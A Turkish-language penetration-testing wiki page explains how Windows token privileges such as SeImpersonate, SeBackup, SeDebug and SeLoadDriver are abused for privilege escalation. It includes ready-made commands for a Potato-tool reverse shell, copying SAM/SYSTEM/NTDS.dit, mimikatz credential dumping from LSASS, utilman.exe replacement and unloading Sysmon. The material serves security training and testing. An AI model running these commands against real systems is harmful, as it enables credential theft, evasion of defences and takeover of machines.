# Token'ları Kötüye Kullanma

{{#include ../../banners/hacktricks-training.md}}

## Tokens

**Windows Access Tokens**'ın ne olduğunu **bilmiyorsanız**, devam etmeden önce bu sayfayı okuyun:


{{#ref}}
access-tokens.md
{{#endref}}

**Zaten sahip olduğunuz token'ları kötüye kullanarak yetkilerinizi yükseltebilirsiniz.**

### SeImpersonatePrivilege

Bu yetki, bir process'in bir token'a handle edinebildiğinde o token'ı taklit etmesine (ancak oluşturamamasına) olanak tanır. Privileged bir token, Windows service'inden (DCOM) bir exploit'e karşı NTLM authentication yapması sağlanarak edinilebilir; bu da sonrasında SYSTEM yetkileriyle bir process çalıştırılmasını mümkün kılar.<sup>[[2]](#references)</sup> Bu primitive, [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (WinRM'nin devre dışı bırakılmış olmasını gerektirir), [SweetPotato](https://github.com/CCob/SweetPotato) ve [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) gibi araçlarla exploit edilebilir.

Yerel bir kullanıcının daha privileged bir identity altında, çağıranın seçtiği bir URL'ye istek gönderen authenticated bir endpoint'e erişebilmesi durumunda, yalnızca loopback üzerinden erişilebilen bir web application ayrı bir coercion olanağı sunabilir. Endpoint'in authorization ve URL kısıtlamalarını, giden isteği yapan client'ın gerçek identity ve authentication davranışını ve bu client'ın düşük yetkili kullanıcının kontrolündeki bir listener'a erişip erişemediğini inceleyin. Etkin bir `SeImpersonatePrivilege`, bir IIS listener'ı veya URL-fetch parametresi tek başına privileged bir token ya da yetki yükseltme yolu bulunduğunu göstermez. Bu incelemeyi pasif tutun; enumeration sırasında coercion istekleri göndermeyin. Microsoft'un [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) ve [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) belgelerine bakın.

Modern operator notları:

- **JuicyPotato artık eski**: Windows 10 1809+/Server 2019+ sistemlerde, hangi RPC/COM yüzeyine hâlâ erişilebildiğine bağlı olarak **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** veya **PrintSpoofer** kullanmayı tercih edin.
- **`LOCAL SERVICE`** veya **`NETWORK SERVICE`** olarak çalışan bir service'i ele geçirdiyseniz ve `whoami /priv` çıktısında `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` olmadan **filtered token** görünüyorsa, önce hesabın **default privilege set**'ini geri alın (örneğin **FullPowers** ile), ardından potato araç ailesini yeniden deneyin.<sup>[[3]](#references)</sup>
- Bazı yeni fork'lar operator'lar için orijinal araçlardan daha kullanışlıdır. Örneğin **SigmaPotato**, reflection/in-memory execution ve modern Windows uyumluluğu eklerken **PrintNotifyPotato**, PrintNotify COM service'ini kötüye kullanır ve klasik Spooler yolu devre dışı olduğunda çoğunlukla kullanışlıdır.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

**SeImpersonatePrivilege**'e çok benzer; ayrıcalıklı bir token elde etmek için **aynı yöntemi** kullanır.\
Ardından bu ayrıcalık, yeni/askıya alınmış bir sürece **birincil token atamaya** izin verir. Ayrıcalıklı impersonation token ile birincil token türetebilirsiniz (DuplicateTokenEx).\
Token ile 'CreateProcessAsUser' kullanarak **yeni bir süreç** oluşturabilir veya askıya alınmış bir süreç oluşturup **token'ı ayarlayabilirsiniz** (genel olarak, çalışan bir sürecin birincil token'ını değiştiremezsiniz).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Bu token etkinse, kimlik bilgilerini bilmeden herhangi bir kullanıcı için bir **impersonation token** elde etmek üzere **KERB_S4U_LOGON** kullanabilir, token'a keyfi bir grup (admins) **ekleyebilir**, token'ın **integrity level**'ını "**medium**" olarak ayarlayabilir ve bu token'ı **geçerli thread'e** atayabilirsiniz (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Bu ayrıcalık, sistemin herhangi bir dosyaya (okuma işlemleriyle sınırlı) **tüm okuma erişimini vermesini** sağlar. Yerel Administrator hesaplarının parola hash'lerini registry'den **okumak** için kullanılır. Ardından, hash ile "**psexec**" veya "**wmiexec**" gibi araçlar kullanılabilir (Pass-the-Hash technique). Ancak bu teknik iki durumda başarısız olur: Local Administrator hesabı devre dışı bırakıldığında veya uzaktan bağlanan Local Administrator'ların yönetici haklarını kaldıran bir ilke uygulandığında.<sup>[[2]](#references)</sup>\
Uygulamada, en güvenilir yerleşik iş akışı genellikle **VSS + `robocopy /b`** kullanır: bir shadow copy oluşturup erişime açın, ardından dosya ACL'lerini atlayan **backup mode** ile `SAM`/`SYSTEM` veya `NTDS.dit` dosyasını kopyalayın.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Bu **yetkiyi kötüye kullanabilirsiniz**:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec) adresinde **IppSec**'i takip ederek
- Ya da aşağıdaki bölümde açıklandığı şekilde:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Bu yetki, dosyanın Access Control List'inden (ACL) bağımsız olarak herhangi bir sistem dosyasına **yazma erişimi** sağlar. **Servisleri değiştirme**, DLL Hijacking gerçekleştirme ve diğer tekniklerin yanı sıra Image File Execution Options üzerinden **debugger** ayarlama gibi çeşitli yetki yükseltme olanakları sunar.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege, özellikle kullanıcının token'ları taklit etme yeteneğine sahip olduğu durumlarda güçlü bir yetkidir; ancak SeImpersonatePrivilege olmadığında da işe yarar. Bu yetenek, aynı kullanıcıyı temsil eden ve bütünlük düzeyi geçerli işlemin düzeyini aşmayan bir token'ı taklit edebilme koşuluna bağlıdır.<sup>[[2]](#references)</sup>

**Önemli Noktalar:**

- **SeImpersonatePrivilege olmadan taklit:** Belirli koşullar altında token'ları taklit ederek EoP için SeCreateTokenPrivilege'den yararlanmak mümkündür.
- **Token taklidi koşulları:** Taklidin başarılı olması için hedef token aynı kullanıcıya ait olmalı ve bütünlük düzeyi, taklit işlemini gerçekleştiren işlemin bütünlük düzeyine eşit veya daha düşük olmalıdır.
- **Taklit token'ları oluşturma ve değiştirme:** Kullanıcılar bir taklit token'ı oluşturabilir ve bu token'a ayrıcalıklı bir grubun SID'sini (Security Identifier) ekleyerek yetkilerini artırabilir.

### SeLoadDriverPrivilege

Bu yetki, belirli `ImagePath` ve `Type` değerlerine sahip bir kayıt defteri girdisi oluşturarak bir işlemin **aygıt sürücülerini yüklemesine ve kaldırmasına** olanak tanır. `HKLM`'ye (HKEY_LOCAL_MACHINE) doğrudan yazma erişimi kısıtlandığından bunun yerine `HKCU` (HKEY_CURRENT_USER) kullanılabilir. Ancak `HKCU` girdisinin çekirdek tarafından sürücü yapılandırması olarak tanınması için belirli bir yol gerekir.<sup>[[2]](#references)</sup>

Modern saldırı amaçlı kullanımda genellikle **BYOVD** (kendi savunmasız sürücünü getir) yöntemi tercih edilir: **imzalı ancak savunmasız** bir çekirdek sürücüsü yüklenir, ardından korumaları devre dışı bırakmak veya çekirdek kodu yürütmeye geçmek için sürücünün IOCTL'leri kullanılır. Yakın tarihli Windows 11/Server derlemelerinde **Microsoft savunmasız sürücü engelleme listesi** ve/veya **HVCI/Memory Integrity** özelliklerinin eski, herkese açık zincirleri genellikle etkisiz hâle getirdiğini unutmayın. Bu nedenle klasik `szkg64.sys` tarzı örnekler artık her durumda güvenilir değildir.

Bu yol `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` şeklindedir; burada `<RID>`, mevcut kullanıcının Relative Identifier'ıdır. `HKCU` içinde bu yolun tamamı oluşturulmalı ve iki değer ayarlanmalıdır:<sup>[[2]](#references)</sup>

- `ImagePath`: yürütülecek binary'nin yolu
- `Type`: `SERVICE_KERNEL_DRIVER` (`0x00000001`) değeri

**İzlenecek Adımlar:**

1. Yazma erişimi kısıtlı olduğundan `HKLM` yerine `HKCU`'ye erişin.
2. `<RID>` mevcut kullanıcının Relative Identifier'ını temsil edecek şekilde, `HKCU` içinde `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` yolunu oluşturun.
3. `ImagePath` değerini binary'nin yürütme yolu olarak ayarlayın.
4. `Type` değerini `SERVICE_KERNEL_DRIVER` (`0x00000001`) olarak belirleyin.

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Bu ayrıcalığı kötüye kullanmanın diğer yolları: [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Bu, **SeRestorePrivilege**'e benzer. Temel işlevi, WRITE_OWNER erişim hakları sağlayarak açıkça yetki verilmesi gerekliliğini aşmak ve bir sürecin **bir nesnenin sahipliğini üstlenmesine** olanak tanımaktır. Süreç, önce yazma amacıyla hedeflenen kayıt defteri anahtarının sahipliğini edinmeyi, ardından yazma işlemlerine izin vermek için DACL'yi değiştirmeyi içerir.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Bu privilege, **belleği okuyup yazmak da dahil olmak üzere diğer process'leri debug etmeye** izin verir. Bu privilege ile çoğu antivirus ve host intrusion prevention çözümünü atlatabilen çeşitli memory injection stratejileri kullanılabilir.<sup>[[2]](#references)</sup>

Modern Windows'ta `SeDebugPrivilege`'in genellikle **korumalı olmayan SYSTEM process'lerini** açmak ve token'larını duplicate etmek için yeterli olduğunu, ancak **LSASS**'a erişebileceğinizi garanti etmediğini unutmayın. **RunAsPPL / LSA Protection** etkinse, `SeDebugPrivilege` mevcut olsa bile korumasız process'ler LSASS'ı okuyamaz veya içine injection yapamaz. Bu durumda başka bir PPL olmayan SYSTEM process'inden token çalın ya da `procdump`'ın çalışacağını varsaymak yerine bir PPL bypass/BYOVD ile zincir kurun. `SeDebugPrivilege` + `SeImpersonatePrivilege` kullanan tam bir token-copy örneği için [bu sayfaya](sedebug-+-seimpersonate-copy-token.md) bakın.

#### Belleği dump et

Bir process'in **belleğini yakalamak** için [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) içindeki [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)'ı kullanabilirsiniz. Bu yöntem, kullanıcının sisteme başarıyla giriş yapmasının ardından kullanıcı kimlik bilgilerini depolamaktan sorumlu olan **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** process'i için kullanılabilir.

Ardından parolaları elde etmek için bu dump'ı mimikatz'a yükleyebilirsiniz:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Önceden kaydedilmiş, okunabilir bir LSASS dökümü, mevcut hesabın canlı korumalı süreci yakalama izni olmasa bile erişilebilir olabilir. Bir döküm dosyasını veya benzer adlı bir arşivi yalnızca ipucu olarak değerlendirin: erişimi ve içeriği doğrulayın, ardından kurtarılan kimlik bilgilerinin hâlâ geçerli olup olmadığını ve daha yüksek ayrıcalıklı bir bağlam sağlayıp sağlamadığını değerlendirin. Dosya adları tek başına bir arşivin döküm içerdiğini veya kimlik bilgilerinin yeniden kullanılabileceğini kanıtlamaz.

#### RCE

Bir `NT SYSTEM` shell'i elde etmek istiyorsanız şunları kullanabilirsiniz:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Bu hak (Birim bakım görevlerini gerçekleştirme), ayrıcalıklı birim işlemlerini destekleyebilir; ancak tek başına okunabilir bir ham birim tanıtıcısını veya rastgele dosyalara erişimi garanti etmez. Aygıt ACL’leri, token durumu, Windows sürümü ve istenen işlem önemini korur. İzin verilen bir birim denetimi işlemi bunun yerine dosya sistemi ACL’lerini değiştirebilir; bu, değişiklik yapan ve potansiyel olarak tüm birimi etkileyen bir işlemdir. CA sunucusunda sertifika istismarları ayrıca kullanılabilir özel anahtar materyaline erişim gerektirir; EFS ile korunan dosyalar için de yetkili bir şifre çözme veya kurtarma anahtarı gerekir. Ayrıntılı ön koşullar aşağıda açıklanmıştır.<sup>[[5]](#references)</sup>

Ayrıntılı tekniklere ve önlemlere bakın:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Ayrıcalıkları denetleyin

```
whoami /priv
```

**Disabled** olarak görünen token'lar genellikle etkinleştirilebilir; bu nedenle hem _Enabled_ hem de _Disabled_ ayrıcalıklarını kötüye kullanabilirsiniz.

### Tüm token'ları etkinleştirme

Devre dışı bırakılmış ayrıcalıklarınız varsa, tüm token'ları etkinleştirmek için [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) betiğini kullanabilirsiniz:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Ya da bu [**yazıda**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) gömülü **script**.

## Table

Tüm token privilege'ları için kapsamlı başvuru tablosu [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin) adresinde; aşağıdaki özet yalnızca privilege'ı kullanarak admin oturumu elde etmenin veya hassas dosyaları okumanın doğrudan yollarını listeler.<sup>[[1]](#references)</sup>

| Privilege                  | Etki      | Araç                    | Çalıştırma yolu                                                                                                                                                                                                                                                                                                                                     | Notlar                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"Kullanıcının token'ları taklit etmesine ve potato.exe, rottenpotato.exe ve juicypotato.exe gibi araçlarla nt system yetkilerine yükselmesine olanak tanır"_                                                                                                                                                                                                      | Güncelleme için [Aurélien Chalot](https://twitter.com/Defte_) teşekkürler. Yakında bunu daha çok adım adım bir tarif gibi yeniden ifade etmeye çalışacağım.                                                                                                                                                                                         |
| **`SeBackup`**             | **Tehdit**  | _**Yerleşik komutlar**_ | `robocopy /b` veya SeBackup-aware özel kopyalama yardımcılarıyla hassas dosyaları okuyun.                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` ve bazen `%WINDIR%\MEMORY.DMP` için kullanışlıdır.<br><br>- `robocopy` kullanışlıdır, ancak özel SeBackup cmdlet'leri/API'leri kilitli veya açık dosyalarda genellikle daha esnektir.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken` ile yerel admin hakları içeren, isteğe bağlı bir token oluşturun.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | **PPL olmayan** bir SYSTEM token'ını çoğaltın veya korumasız bir process'in belleğini dump edin.                                                                                                                                                                                                                                                                 | <p>RunAsPPL/LSA Protection etkinse LSASS dump işlemi genellikle engellenir.</p><p>Script [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) adresinde bulunabilir.</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | SYSTEM process'i başlatmak için **Potato ailesini** / named-pipe taklidini kullanın (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` vb.).                                                                                                                                                                                    | <p>En kullanışlı olduğu bağlamlar IIS APPPOOL, MSSQL, scheduled task'ler gibi service account'ları veya `SeImpersonatePrivilege` sahibi olan diğer bağlamlardır.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. İmzalı ancak savunmasız bir kernel driver'ı yükleyin (BYOVD)<br>2. Kernel R/W elde etmek, güvenlik araçlarını devre dışı bırakmak veya SYSTEM yetkilerine yükselmek için driver'ın IOCTL'lerini kullanın<br><br>Alternatif olarak bu privilege, güvenlikle ilgili driver'ları yerleşik <code>fltMC</code> komutuyla kaldırmak için kullanılabilir; ör. <code>fltMC sysmondrv</code></p>                     | <p><code>szkg64.sys</code> gibi eski, herkese açık driver'lar modern Windows'ta savunmasız driver engelleme listesi / HVCI tarafından giderek daha fazla engelleniyor.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege'ı mevcutken PowerShell/ISE'yi başlatın.<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>) ile privilege'ı etkinleştirin.<br>3. utilman.exe dosyasını utilman.old olarak yeniden adlandırın<br>4. cmd.exe dosyasını utilman.exe olarak yeniden adlandırın<br>5. Konsolu kilitleyin ve Win+U tuşlarına basın</p> | <p>Saldırı bazı AV yazılımları tarafından tespit edilebilir.</p><p>Alternatif yöntem, aynı privilege'ı kullanarak "Program Files" içinde saklanan service binary'lerini değiştirmeye dayanır</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Yerleşik komutlar**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe dosyasını utilman.exe olarak yeniden adlandırın<br>4. Konsolu kilitleyin ve Win+U tuşlarına basın</p>                                                                                                                                       | <p>Saldırı bazı AV yazılımları tarafından tespit edilebilir.</p><p>Alternatif yöntem, aynı privilege'ı kullanarak "Program Files" içinde saklanan service binary'lerini değiştirmeye dayanır.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Token'ları, yerel admin haklarını içerecek şekilde değiştirin. SeImpersonate gerekebilir.</p><p>Doğrulanması gerekiyor.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - Windows privilege'larından admin'e giden exploitation yolları](https://github.com/gtworek/Priv2Admin)
- [2] [LPE için Token Privilege'larını kötüye kullanma](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Privilege'larımı geri verin! Lütfen?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` yedekleme modu dosya/klasör ACL denetimlerini atlar)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Birim bakım görevlerini gerçekleştirme (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
